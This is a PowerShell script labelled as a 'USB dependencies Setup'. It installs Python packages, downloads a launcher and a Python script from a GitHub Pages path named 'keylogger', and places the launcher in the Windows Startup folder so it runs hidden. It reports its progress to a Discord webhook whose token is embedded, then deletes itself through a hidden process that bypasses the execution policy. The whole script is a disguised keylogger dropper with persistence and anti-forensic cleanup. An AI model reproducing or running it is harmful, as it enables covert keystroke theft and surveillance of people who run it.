# =========================
# Configuration
# =========================

$WebhookURL = "https://discord.com/api/webhooks/1464360790571094027/X9kN7viRzmX_iq3KVLJeKx6zEAI5ur-YYk5QnX2tSCh-ZTLGI3sm5KtaKVSRrzpLGuFb"
$Headers = @{ "User-Agent" = "PowerShell" }

# =========================
# Helper: Send Discord Log
# =========================

function Send-WebhookMessage {
    param([string]$Message)

    $Body = @{ content = $Message } | ConvertTo-Json -Compress
    Invoke-RestMethod `
        -Uri $WebhookURL `
        -Method Post `
        -Headers $Headers `
        -Body $Body `
        -ContentType "application/json"
}

Send-WebhookMessage "**PowerShell 'USB dependencies Setup' script** started."

# ===============================
# Download required dependencies
# ===============================

function Install-PythonPackage {
    param([string]$Name)

    try {
        Write-Host "Installing Python package: $Name"
        python -m pip install --user $Name
        Send-WebhookMessage "**Installed Python package:** $Name"
    }
    catch {
        Send-WebhookMessage "**Failed to install Python package:** $Name | Error: $($_.Exception.Message)"
        throw
    }
}

# =========================
# Install Dependencies
# =========================

Install-PythonPackage "psutil"
Install-PythonPackage "rich"

# =================================
# Run and install required scripts
# =================================

# Define StartUp directory (expand %APPDATA% path)
$StartDir = [System.Environment]::GetFolderPath('ApplicationData') + "\Microsoft\Windows\Start Menu\Programs\Startup\usb_launcher.cmd"

# Define URL of the startup script
$StartUrl = "https://mynewaccount-website.github.io/keylogger/usb_launcher.cmd"

# Download the script to StartUp directory
Invoke-WebRequest -Uri $StartUrl -OutFile $StartDir

# Define Temp directory for Python script
$PythonPath = Join-Path $env:TEMP "main.py"

# Define URL of the Python script
$PythonUrl = "https://mynewaccount-website.github.io/keylogger/main.py"

# Download the Python script
Invoke-WebRequest -Uri $PythonUrl -OutFile $PythonPath

# Opening "RUN.cmd" file in startup
Start-Process -FilePath "$StartDir" -WindowStyle Hidden

# Send control message to the server
Send-WebhookMessage "**PowerShell 'USB dependencies Setup' script** downloaded everything **successfully!**. Preparing for the cleanup."

# Wait for 5 seconds before cleanup
Start-Sleep -Seconds 5

# Send control message to the server
Send-WebhookMessage "**PowerShell 'USB dependencies Setup' script** has **successfully finished** the script!"
Write-Host "Execution was successfull!"

# Cleanup / auto-delete
$scriptPath = $MyInvocation.MyCommand.Path

# Run a new PowerShell process to delete the script after it finishes
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command Remove-Item -Path '$scriptPath' -Force" -WindowStyle Hidden

# Exit the script
exit